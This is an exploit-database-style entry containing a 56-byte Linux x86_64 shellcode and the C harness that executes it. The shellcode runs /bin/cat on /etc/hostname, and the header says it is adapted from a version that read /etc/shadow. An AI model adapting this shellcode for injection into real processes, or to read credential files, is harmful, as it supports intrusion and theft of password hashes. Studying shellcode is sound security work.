/*
# Exploit Title: Linux/x64 polymopheric_shorter_hostname Shellcode
#change from original:pushed hostname instead odf shadow
#orinal version : https://www.exploit-db.com/shellcodes/49547
# Author: Lokavya PolamReddy
# Date: 2026-05-24
# Platform: Linux x86_64
# Shellcode Length: 56 bytes
# Tested on: Kali Linux
# CVE: N/A
*/
#include <stdio.h>
#include <string.h>

unsigned char code[] =\
"\x31\xf6\xf7\xe6\x50\x48\xb9\x68\x6f\x73\x74\x6e\x61\x6d\x65\x51\x48\xb9\x2f\x2f\x2f\x2f\x65\x74\x63\x2f\x51\x49\x89\xe0\x50\x48\xb9\x2f\x62\x69\x6e\x2f\x63\x61\x74\x51\x48\x89\xe7\x50\x41\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05";
int  main()
{
    printf("Shellcode length: %d\n", sizeof(code)-1);

    int (*ret)() = (int(*)())code;
    ret();
   return 0;

}
